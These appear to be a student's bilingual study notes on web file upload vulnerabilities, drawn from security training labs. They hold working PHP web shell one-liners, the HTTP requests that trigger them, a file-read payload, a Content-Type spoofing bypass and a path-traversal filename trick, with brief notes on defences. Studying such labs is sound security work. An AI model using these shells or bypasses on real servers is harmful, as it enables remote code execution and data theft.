## File upload vulnerabilities
- Web Shell  / reverse Shell
- 伺服器配置允許某些類型的文件（例如.php和.jsp)
- 最糟糕的情況是網站允許你上傳伺服器端腳本（例如 PHP、Java 或 Python 檔案）<br>

PHP 
- "<"?php echo file_get_contents('/path/to/target/file'); ?">"
- "<"?php echo system($_GET['command']); ?">"
- GET /example/exploit.php?command=id HTTP/1.1

## Lab: Remote code execution via web shell upload
-  圖片上傳功能
- 不會對其進行任何驗證 
- upload exploit.php (<?php echo file_get_contents('/home/carlos/secret'); ?>)
- GET /files/avatars/exploit.php HTTP/1.1 <br>

防禦措施
- 檢查此輸入特定的Content-Type標頭是否與預期的 MIME 類型相符
- Request header:
    - Content-Type:application/x-www-form-url-encoded
    - Content-Type: multipart/form-data
- Content-Type標頭，用於告知伺服器使用此輸入框提交的資料的 MIME 類型
- Content-Disposition標頭，用於提供與其相關的輸入欄位的一些基本資訊
- e.g if 伺服器只接受圖像文件，則可能只允許諸如image/jpeg和 之類的類型image/png

## Lab: Web shell upload via Content-Type restriction bypass
- change Content-Type : image/jpeg

## Lab: Web shell upload via path traversal
- Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
